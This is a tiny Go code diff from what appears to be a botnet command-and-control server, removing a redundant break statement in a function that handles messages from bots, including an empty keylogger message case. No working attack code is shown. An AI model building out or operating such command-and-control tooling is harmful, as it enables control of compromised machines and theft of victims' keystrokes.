@@ -70,7 +70,7 @@ func (c *c2) listentoBot(bot *Bot) {
 		switch msg.Type {
 		case ERROR_MSG:
 			fmt.Println("ERROR MESSAGE FROM BOT : ", bot.ID, "ERROR : ", msg.Message)
-			break
+
 		case KEYLOGGER:
 
 		}
